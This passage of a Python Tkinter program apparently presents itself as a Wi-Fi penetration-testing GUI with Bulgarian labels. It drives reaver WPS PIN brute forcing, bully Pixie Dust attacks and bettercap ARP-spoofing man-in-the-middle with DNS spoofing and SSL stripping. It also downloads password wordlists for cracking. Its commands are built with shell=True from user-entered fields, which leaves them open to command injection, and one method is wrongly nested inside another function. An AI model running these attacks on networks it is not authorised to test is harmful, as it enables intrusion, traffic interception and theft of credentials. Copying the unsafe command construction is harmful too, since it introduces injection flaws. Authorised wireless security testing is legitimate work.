                                capture_output=True, 
                                text=True)
            return "Mode:Monitor" in result.stdout
        except:
            return False

    def update_wordlists(self):
        """Обновява списъка с речници."""
        wordlists = glob.glob(f"{self.wordlists_dir}/*.txt")
        wordlists += glob.glob("/usr/share/wordlists/*.txt")
        wordlists = list(set(wordlists))  # Премахване на дублирани
        
        if wordlists:
            self.wordlist_combo["values"] = wordlists
            self.wordlist_combo.current(0)
            self.log_message(f"Заредени {len(wordlists)} речника.", "success")
        else:
            self.log_message("Няма намерени речници.", "warning")

    def select_crack_file(self):
        """Избира файл за кракване."""
        file = filedialog.askopenfilename(initialdir=self.cap_files_dir,
                                        filetypes=[("Capture files", "*.cap *.pcapng *.hccapx")])
        if file:
            self.crack_file.delete(0, tk.END)
            self.crack_file.insert(0, file)

    def stop_actions(self):
        """Спира всички активни процеси."""
        self.log_message("Спиране на всички активни процеси...")
        commands = [
            "sudo pkill airodump-ng",
            "sudo pkill bully",
            "sudo pkill hcxdumptool",
            "sudo pkill hostapd",
            "sudo pkill mdk4",
            "sudo pkill hashcat",
            "sudo pkill wifite",
            "sudo pkill bettercap",
            "sudo pkill kismet"
        ]
        
        for cmd in commands:
            subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            
        self.log_message("Всички процеси са спрени.", "success")
        self.status_mode.set("Нормален")

    def on_network_select(self, event):
        """Обработва избор на мрежа от таблицата."""
        selected = self.network_table.selection()
        if selected:
            item = self.network_table.item(selected[0])
            bssid = item["values"][0]
            essid = item["values"][1]
            self.log_message(f"Избрана мрежа: {essid} ({bssid})")

    def scan_wps_info(self, bssid, channel):
        """Сканира за WPS информация за конкретна мрежа"""
        try:
            command = f"sudo wash -i {self.interface.get()} -c {channel} -a"
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE, text=True)
            
            wps_info = {
                'Locked': 'Не',
                'Version': '1.0',
                'Vendor': 'Неизвестен',
                'ConfigMethods': 'Неизвестно'
            }
            
            while True:
                line = process.stdout.readline()
                if not line:
                    break
                
                if bssid.lower() in line.lower():
                    parts = re.split(r'\s+', line.strip())
                    if len(parts) >= 8:
                        wps_info.update({
                            'Locked': 'Да' if 'Yes' in parts[3] else 'Не',
                            'Version': parts[4],
                            'Vendor': parts[5],
                            'ConfigMethods': parts[6]
                        })
                    break
            
            process.terminate()
            return wps_info
            
        except Exception as e:
            self.log_message(f"Грешка при сканиране на WPS: {str(e)}", "error")
            return None

    def show_wps_details(self, event=None):
        """Показва подробна WPS информация за избраната мрежа"""
        selected = self.network_table.selection()
        if not selected:
            return
            
        bssid = self.network_table.item(selected[0])["values"][0]
        channel = self.network_table.item(selected[0])["values"][2]
        
        wps_info = self.scan_wps_info(bssid, channel)
        if not wps_info:
            self.log_message("Неуспешно сканиране на WPS информация", "error")
            return
        
        # Създаваме прозорец за детайли
        details_window = tk.Toplevel(self)
        details_window.title(f"WPS детайли за {bssid}")
        details_window.geometry("400x300")
        
        # Добавяме информацията
        info_frame = ttk.Frame(details_window)
        info_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        ttk.Label(info_frame, text="WPS детайли", font=('Arial', 12, 'bold')).pack(pady=5)
        
        rows = [
            ("BSSID:", bssid),
            ("Заключен:", wps_info['Locked']),
            ("Версия:", wps_info['Version']),
            ("Производител:", wps_info['Vendor']),
            ("Методи за конфигурация:", wps_info['ConfigMethods'])
        ]
        
        for label, value in rows:
            frame = ttk.Frame(info_frame)
            frame.pack(fill="x", pady=2)
            
            ttk.Label(frame, text=label, width=20, anchor="e").pack(side="left")
            ttk.Label(frame, text=value, foreground="#4CAF50").pack(side="left", padx=5)
        
        # Бутон за тестване на WPS
        ttk.Button(info_frame, text="Тествай WPS", 
                command=lambda: self.test_wps_connection(bssid, channel)).pack(pady=10)
        
    def test_wps_connection(self, bssid, channel):
        """Тества WPS връзката без да се опитва да я пробие"""
        self.log_message(f"Тестване на WPS за {bssid} на канал {channel}")
        
        test_window = tk.Toplevel(self)
        test_window.title(f"WPS тест за {bssid}")
        test_window.geometry("600x400")
        
        log = tk.Text(test_window, height=20, bg="#2D2D2D", fg="white", 
                    insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(test_window, command=log.yview)
        log.configure(yscrollcommand=scrollbar.set)
        
        log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        def run_test():
            try:
                command = f"sudo reaver -i {self.interface.get()} -b {bssid} -c {channel} -vv -K 1"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, text=True)
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    log.insert(tk.END, line)
                    log.see(tk.END)
                    
                    if "WPS transaction failed" in line:
                        log.insert(tk.END, "\nWPS не е достъпен\n", "error")
                        break
                    elif "WPS pin not found" in line:
                        log.insert(tk.END, "\nWPS е достъпен, но PIN не е намерен\n", "warning")
                        break
                    elif "WPS pin found" in line:
                        log.insert(tk.END, "\nWPS е достъпен и PIN е намерен\n", "success")
                        break
                
                process.terminate()
                
            except Exception as e:
                log.insert(tk.END, f"Грешка при тестване: {str(e)}\n")
        
        threading.Thread(target=run_test, daemon=True).start()

    def mitm_attack(self):
        """Изпълнява Man-in-the-Middle атака"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа.", "warning")
            return

        bssid = self.network_table.item(selected[0])["values"][0]
        essid = self.network_table.item(selected[0])["values"][1]

        self.log_message(f"Стартиране на MITM атака срещу {essid}")

        mitm_window = tk.Toplevel(self)
        mitm_window.title(f"MITM атака: {essid}")
        mitm_window.geometry("800x600")

        # Контроли за MITM атака
        control_frame = ttk.Frame(mitm_window)
        control_frame.pack(fill="x", padx=10, pady=5)

        ttk.Label(control_frame, text="Целеви клиент:").pack(side="left")
        self.target_client = ttk.Entry(control_frame, width=20)
        self.target_client.pack(side="left", padx=5)
        self.target_client.insert(0, "всички")

        ttk.Button(control_frame, text="DNS Spoofing", 
                command=lambda: self.start_dns_spoofing()).pack(side="left", padx=5)
        ttk.Button(control_frame, text="SSL Strip", 
                command=lambda: self.start_ssl_strip()).pack(side="left", padx=5)

        # Лог
        mitm_log = tk.Text(mitm_window, height=25, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(mitm_window, command=mitm_log.yview)
        mitm_log.configure(yscrollcommand=scrollbar.set)

        mitm_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")

        def run_mitm():
            try:
                command = f"sudo bettercap -iface {self.interface.get()} -eval \"net.recon on; net.probe on; set arp.spoof.targets {self.target_client.get()}; arp.spoof on\""
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, text=True)

                self.active_attacks["MITM"] = {
                    "process": process,
                    "window": mitm_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }

                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    mitm_log.insert(tk.END, line)
                    mitm_log.see(tk.END)

            except Exception as e:
                mitm_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["MITM"]["status"] = "failed"

        threading.Thread(target=run_mitm, daemon=True).start()

    def wps_brute_force(self):
        """Изпълнява brute force атака срещу WPS PIN"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа с активиран WPS", "warning")
            return

        bssid = self.network_table.item(selected[0])["values"][0]
        essid = self.network_table.item(selected[0])["values"][1]
        channel = self.network_table.item(selected[0])["values"][2]

        self.log_message(f"Стартиране на WPS brute force атака срещу {essid} ({bssid})", "info")

        # Създаване на прозорец за проследяване
        brute_window = tk.Toplevel(self)
        brute_window.title(f"WPS Brute Force: {essid}")
        brute_window.geometry("700x500")

        # Добавяне на контроли
        control_frame = ttk.Frame(brute_window)
        control_frame.pack(fill="x", padx=10, pady=5)

        ttk.Label(control_frame, text="Режим:").pack(side="left")
        self.brute_mode = ttk.Combobox(control_frame, values=["Стандартен", "Интензивен"], state="readonly")
        self.brute_mode.current(0)
        self.brute_mode.pack(side="left", padx=5)

        ttk.Label(control_frame, text="Задержка:").pack(side="left", padx=10)
        self.brute_delay = ttk.Spinbox(control_frame, from_=1, to=60, width=3)
        self.brute_delay.set("5")
        self.brute_delay.pack(side="left")

        # Лог
        brute_log = tk.Text(brute_window, height=20, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(brute_window, command=brute_log.yview)
        brute_log.configure(yscrollcommand=scrollbar.set)

        brute_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")

        # Прогрес
        progress = ttk.Progressbar(brute_window, maximum=10000, value=0)
        progress.pack(fill="x", padx=10, pady=5)

        def run_brute_force():
            try:
                mode = "-S" if self.brute_mode.get() == "Интензивен" else ""
                delay = f"-d {self.brute_delay.get()}" if int(self.brute_delay.get()) > 1 else ""
                
                command = (f"sudo reaver -i {self.interface.get()} -b {bssid} -c {channel} "
                        f"{mode} {delay} -vv -K 1 -f -o {self.output_dir}/wps_brute_{bssid.replace(':', '')}.txt")
                
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, text=True)

                self.active_attacks["WPS_Brute"] = {
                    "process": process,
                    "window": brute_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }

                pin_attempts = 0
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break

                    brute_log.insert(tk.END, line)
                    brute_log.see(tk.END)

                    # Парсване на прогреса
                    if "Trying pin" in line:
                        pin_attempts += 1
                        progress["value"] = pin_attempts
                        brute_window.update()

                    if "WPS pin not found" in line:
                        brute_log.insert(tk.END, "\nНеуспешен опит за намиране на PIN\n", "error")
                        break

                    if "WPS pin found" in line:
                        pin = line.split(":")[-1].strip()
                        brute_log.insert(tk.END, f"\nУСПЕХ! Намерен WPS PIN: {pin}\n", "success")
                        self.log_message(f"WPS PIN намерен за {essid}: {pin}", "success")
                        break

                process.terminate()
                self.active_attacks["WPS_Brute"]["status"] = "completed"

            except Exception as e:
                brute_log.insert(tk.END, f"Грешка: {str(e)}\n")
                self.active_attacks["WPS_Brute"]["status"] = "failed"

        threading.Thread(target=run_brute_force, daemon=True).start()

    def pixie_dust_test(self):
        """Изпълнява тест за уязвимост към Pixie Dust атака"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа с активиран WPS", "warning")
            return

        bssid = self.network_table.item(selected[0])["values"][0]
        essid = self.network_table.item(selected[0])["values"][1]
        channel = self.network_table.item(selected[0])["values"][2]

        self.log_message(f"Стартиране на Pixie Dust тест за {essid} ({bssid})", "info")

        # Създаване на прозорец за проследяване
        pixie_window = tk.Toplevel(self)
        pixie_window.title(f"Pixie Dust тест: {essid}")
        pixie_window.geometry("700x500")

        # Лог
        pixie_log = tk.Text(pixie_window, height=25, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(pixie_window, command=pixie_log.yview)
        pixie_log.configure(yscrollcommand=scrollbar.set)

        pixie_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")

        # Прогрес
        progress = ttk.Progressbar(pixie_window, maximum=100, value=0)
        progress.pack(fill="x", padx=10, pady=5)

        def run_pixie_test():
            try:
                command = (f"sudo bully -i {self.interface.get()} -b {bssid} -c {channel} "
                        f"-B -F -v 3 -o {self.output_dir}/pixie_test_{bssid.replace(':', '')}.txt")
                
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, text=True)

                self.active_attacks["Pixie_Test"] = {
                    "process": process,
                    "window": pixie_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }

                while True:
                    line = process.stdout.readline()
                    if not line:
                        break

                    pixie_log.insert(tk.END, line)
                    pixie_log.see(tk.END)

                    # Парсване на прогреса
                    if "Progress:" in line:
                        try:
                            pct = float(line.split("Progress:")[1].split("%")[0].strip())
                            progress["value"] = pct
                            pixie_window.update()
                        except:
                            pass

                    if "WPS PIN:" in line:
                        pin = line.split(":")[1].strip()
                        pixie_log.insert(tk.END, f"\nУСПЕХ! Мрежата е уязвима към Pixie Dust. PIN: {pin}\n", "success")
                        self.log_message(f"Pixie Dust успешен за {essid}: {pin}", "success")
                        break

                    if "Pixie-Dust attempt failed" in line:
                        pixie_log.insert(tk.END, "\nМрежата не е уязвима към Pixie Dust\n", "warning")
                        break

                process.terminate()
                self.active_attacks["Pixie_Test"]["status"] = "completed"

            except Exception as e:
                pixie_log.insert(tk.END, f"Грешка: {str(e)}\n")
                self.active_attacks["Pixie_Test"]["status"] = "failed"

        threading.Thread(target=run_pixie_test, daemon=True).start()

    def toggle_theme(self):
        """Превключва между тъмен и светъл режим."""
        if self["bg"] == "#1E1E1E":  # Тъмен → светъл
            self.configure(bg="#F0F0F0")
            self.style.configure(".", background="#F0F0F0", foreground="black")
            self.style.configure("TEntry", fieldbackground="#FFFFFF")
            self.style.configure("Treeview", background="#FFFFFF", foreground="black", fieldbackground="#FFFFFF")
            self.style.map("TNotebook.Tab", background=[("selected", "#4CAF50")])
            
            for widget in [self.log_text, self.attack_log, self.crack_log, self.network_info, self.report_content]:
                widget.configure(bg="white", fg="black", insertbackground="black")
                
            self.fig.set_facecolor("white")
            self.ax.set_facecolor("white")
            self.ax.tick_params(colors="black")
            self.ax.set_title("Топ 10 мрежи по сила на сигнала", color="black")
            self.ax.set_xlabel("Сигнал (dBm)", color="black")
            self.canvas.draw()
            
            self.log_message("Светла тема е активирана.", "success")
        else:  # Светъл → тъмен
            self.configure(bg="#1E1E1E")
            self.style.configure(".", background="#1E1E1E", foreground="white")
            self.style.configure("TEntry", fieldbackground="#2D2D2D")
            self.style.configure("Treeview", background="#2D2D2D", foreground="white", fieldbackground="#2D2D2D")
            self.style.map("TNotebook.Tab", background=[("selected", "#4CAF50")])
            
            for widget in [self.log_text, self.attack_log, self.crack_log, self.network_info, self.report_content]:
                widget.configure(bg="#2D2D2D", fg="white", insertbackground="white")
                
            self.fig.set_facecolor("#1E1E1E")
            self.ax.set_facecolor("#2D2D2D")
            self.ax.tick_params(colors="white")
            self.ax.set_title("Топ 10 мрежи по сила на сигнала", color="white")
            self.ax.set_xlabel("Сигнал (dBm)", color="white")
            self.canvas.draw()
            
            self.log_message("Тъмна тема е активирана.", "success")

    def download_wordlists(self):
        """Изтегля популярни речници автоматично"""
        wordlist_urls = {
            "rockyou.txt": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
            "darkweb2017.txt": "https://github.com/danielmiessler/SecLists/raw/master/Passwords/darkweb2017-top10000.txt"
        }
        
        dialog = tk.Toplevel(self)
        dialog.title("Изтегляне на речници")
        dialog.geometry("500x300")
        
        progress = ttk.Progressbar(dialog, maximum=100, value=0)
        progress.pack(fill="x", padx=10, pady=10)
        
        status = ttk.Label(dialog, text="Подготвя се изтегляне...")
        status.pack(pady=5)
        
        log = tk.Text(dialog, height=10, bg="#2D2D2D", fg="white", wrap="word")
        scrollbar = ttk.Scrollbar(dialog, command=log.yview)
        log.configure(yscrollcommand=scrollbar.set)
        
        log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        def download():
            try:
                for name, url in wordlist_urls.items():
                    log.insert(tk.END, f"Изтегляне на {name}...\n")
                    dialog.update()
                    
                    response = requests.get(url, stream=True)
                    total_size = int(response.headers.get('content-length', 0))
                    block_size = 1024
                    progress["maximum"] = total_size
                    
                    with open(f"{self.wordlists_dir}/{name}", "wb") as f:
                        for data in response.iter_content(block_size):
                            f.write(data)
                            progress["value"] += len(data)
                            dialog.update()
                    
                    log.insert(tk.END, f"Успешно изтеглен {name}\n")
                
                log.insert(tk.END, "\nВсички речници са изтеглени успешно!\n")
                self.update_wordlists()
                
            except Exception as e:
                log.insert(tk.END, f"Грешка при изтегляне: {str(e)}\n")
        
        threading.Thread(target=download, daemon=True).start()

    def create_network_map(self):
        """Създава интерактивна карта на WiFi мрежите"""
        map_frame = ttk.Frame(self.scan_tab)
        map_frame.pack(fill="both", expand=True, pady=5)
        
        self.network_canvas = tk.Canvas(map_frame, bg="#2D2D2D", width=800, height=400)
        scroll_x = ttk.Scrollbar(map_frame, orient="horizontal", command=self.network_canvas.xview)
        scroll_y = ttk.Scrollbar(map_frame, orient="vertical", command=self.network_canvas.yview)
        self.network_canvas.configure(xscrollcommand=scroll_x.set, yscrollcommand=scroll_y.set)
        
        self.network_canvas.pack(side="left", fill="both", expand=True)
        scroll_y.pack(side="right", fill="y")
        scroll_x.pack(side="bottom", fill="x")
        
        # Примерна визуализация - в реална версия ще се използват реални данни
        self.draw_network_map()
            
        def draw_network_map(self):
            """Рисува мрежите върху картата"""
            if not hasattr(self, 'network_canvas'):
                return
                
            self.network_canvas.delete("all")
            
            # Централна точка (роутер)
            center_x, center_y = 400, 200
            self.network_canvas.create_oval(center_x-10, center_y-10, center_x+10, center_y+10, 
                                        fill="#4CAF50", outline="white")
            
            # Клиенти (симулирани)
            for i in range(5):
                angle = random.uniform(0, 2*math.pi)
                dist = random.randint(50, 150)
                x = center_x + dist * math.cos(angle)
                y = center_y + dist * math.sin(angle)
                
                self.network_canvas.create_oval(x-5, y-5, x+5, y+5, fill="#FF5555", outline="white")
                self.network_canvas.create_line(center_x, center_y, x, y, fill="#555555", dash=(2,2))

    def show_authors(self):
        """Показва информация за авторите."""
        messagebox.showinfo("За авторите", 
                        "WiFi GUI Pentest PRO 2025\n\n"
                        "Разработен от:\n"
                        "- Martin Stefanov\n"
                        "Лиценз: GNU GPLv3\n"
                        "GitHub: https://github.com/sauron666/Wifi-GUI-Tool")

    def check_updates(self):
        """Проверява за актуализации."""
        self.log_message("Проверка за актуализации...")
        try:
            result = subprocess.check_output("git ls-remote https://github.com/sauron666/Wifi-GUI-Tool", 
                                        shell=True, text=True, stderr=subprocess.DEVNULL)
            if result:
                self.log_message("Налична е нова версия. Моля, посетете GitHub.", "success")
            else:
                self.log_message("Вие използвате най-новата версия.", "success")
        except Exception as e:
            self.log_message(f"Грешка при проверка за актуализации: {str(e)}", "error")

    def show_docs(self):
        """Показва документацията."""
        docs = """WiFi GUI Pentest PRO 2025 - Документация
Сканиране:

Изберете интерфейс и кликнете 'Сканирай'

Филтрирайте по WPS или тип криптиране

Атаки:

WPS: Pixie Dust, Offline PIN

WPA/WPA2: PMKID, деавторизация

WPA3: Dragonblood атаки

Автоматичен одит: тества всички методи

Кракване:

Изберете файл с хендшейк

Изберете речник

Стартирайте кракване с GPU ускорение

Доклади:

Генерирайте PDF/HTML доклади

Персонализирайте съдържание

За повече информация посетете GitHub страницата.
"""
        dialog = tk.Toplevel(self)
        dialog.title("Документация")
        dialog.geometry("600x400")
        
        text = tk.Text(dialog, wrap="word", padx=10, pady=10)
        scrollbar = ttk.Scrollbar(dialog, command=text.yview)
        text.configure(yscrollcommand=scrollbar.set)
        
        text.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        text.insert(tk.END, docs)
        text.config(state="disabled")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Моля, стартирайте приложението с root права (sudo).")
        exit(1)
        
    app = WiFiGUIPentestPro()
    app.mainloop()